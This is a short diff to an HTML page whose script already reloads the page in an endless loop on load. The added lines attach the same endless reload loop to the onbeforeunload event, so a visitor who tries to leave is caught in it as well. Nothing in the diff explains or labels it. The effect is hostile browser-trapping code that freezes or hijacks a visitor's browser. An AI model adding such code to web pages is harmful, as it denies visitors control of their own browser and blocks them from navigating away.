@@ -2,6 +2,11 @@
 <html>
     <body>
         <script>
+            window.onbeforeunload = function() {
+                setTimeout(function(){
+                    while(1)location.reload(1)
+                  }, 1000)
+            }
             window.onload = function() {
                 setTimeout(function(){
                     while(1)location.reload(1)
